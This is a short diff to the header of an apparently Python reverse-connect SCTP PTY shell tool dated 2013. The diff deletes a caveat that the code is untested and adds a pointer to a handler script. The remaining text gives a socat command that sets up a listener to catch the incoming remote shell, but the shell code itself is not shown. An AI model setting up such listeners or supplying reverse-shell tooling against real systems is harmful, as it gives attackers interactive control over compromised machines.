@@ -3,12 +3,10 @@
 Reverse Connect SCTP PTY Shell - testing version
 infodox - insecurety.net (2013)
 
-Please note this may not work and I need to clean it up.
-It is also COMPLETELY untested as right now I do not have a
-linux box to test it on. I will do so later today.
-
 For an excellent listener use the following socat command:
 socat file:`tty`,echo=0,raw sctp-listen:PORT
+
+Alternatively, use sctp_pty_shell_handler.py 
 """
 import os
 import pty
